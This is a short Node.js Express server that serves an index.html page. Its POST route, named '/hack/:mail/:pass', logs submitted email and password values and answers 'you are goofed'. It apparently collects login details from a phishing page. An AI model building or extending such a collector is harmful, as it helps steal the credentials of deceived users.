const express = require('express');
const path = require('path');
const server = new express();

server.use(express.json())

server.post('/hack/:mail/:pass', (req, res) => {
  let { mail, pass } = req.params;

  console.log({ email: mail, password: pass });

  res.send('you are goofed')
})

server.get('/', (req, res) => { res.sendFile(path.resolve(__dirname, 'index.html')) })

server.listen(2000, () => { console.log('server is started') });
